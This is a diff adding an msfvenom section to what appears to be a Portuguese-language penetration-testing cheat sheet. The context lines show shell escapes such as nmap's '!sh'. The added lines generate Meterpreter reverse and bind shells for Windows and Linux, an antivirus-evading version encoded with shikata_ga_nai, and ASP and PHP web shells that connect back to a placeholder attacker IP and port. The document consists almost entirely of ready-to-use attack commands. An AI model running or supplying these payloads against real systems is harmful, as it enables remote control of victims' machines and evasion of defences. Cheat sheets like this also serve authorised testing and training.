@@ -115,6 +115,34 @@ exec "/bin/sh"
 (From within nmap)
 !sh
 
+-- MSFVENOM
+
+Listar payloads
+msfvenom -l payloads
+
+Listar encoders
+msfvenom -l encoders
+
+Meterpreter Reverse TCP Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f exe > shell.exe
+
+Reverse HTTPS Shell
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<Porta> -f exe > shell.exe
+
+Encoded Meterpreter Reverse HTTPS Shell
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<Porta> -e x86/shikata_ga_nai -i 20 -f exe > shell.exe
+
+Meterpreter Reverse TCP Shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f elf > reverseTCP.elf
+
+Bind TCP Shell
+msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=<IP> LPORT=<Porta> -f elf > bindTCP.elf
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f asp > shell.asp
+
+PHP
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f raw -o shell.php
 
 
 
